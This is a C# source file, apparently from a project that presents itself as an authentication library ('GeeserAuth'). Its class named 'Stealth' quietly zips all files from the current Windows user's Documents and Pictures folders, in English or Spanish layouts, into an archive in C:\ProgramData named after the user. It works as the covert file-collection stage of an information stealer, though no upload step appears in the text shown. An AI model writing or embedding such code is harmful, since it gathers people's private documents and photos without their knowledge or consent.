using System;
using System.IO;
using System.IO.Compression;
using static GeeserAuth.IpAuth;

namespace GeeserAuth
{
    internal class Stealth
    {
        public static string pack()
        {
            string spanish = @"C:\Usuarios";
            string english = @"C:\Users";
            if (Directory.Exists(spanish))
            {
                var zipFiles = @"C:\ProgramData\" + wuser() + ".zip";
                var files = Directory.GetFiles(@"C:\Usuarios\" + wuser() + @"\Documentos");
                var filess = Directory.GetFiles(@"C:\Usuarios\" + wuser() + @"\Imágenes");
                using (var archive = ZipFile.Open(zipFiles, ZipArchiveMode.Create))
                {
                    foreach (var fPath in files)
                    {
                        archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath));
                    }
                    foreach (var fPath in filess)
                    {
                        archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath));
                    }
                }
            }
            else if (Directory.Exists(english))
            {
                var zipFile = @"C:\ProgramData\" + wuser() + ".zip";
                var files = Directory.GetFiles(@"C:\Users\" + wuser() + @"\Documents\");
                var filesp = Directory.GetFiles(@"C:\Users\" + wuser() + @"\Pictures");
                using (var archive = ZipFile.Open(zipFile, ZipArchiveMode.Create))
                {
                    foreach (var fPath in files)
                    {
                        archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath));
                    }
                    foreach (var fPath in filesp)
                    {
                        archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath));
                    }
                }
            }
            else { Environment.Exit(1); }
            return spanish;
        }
    }
}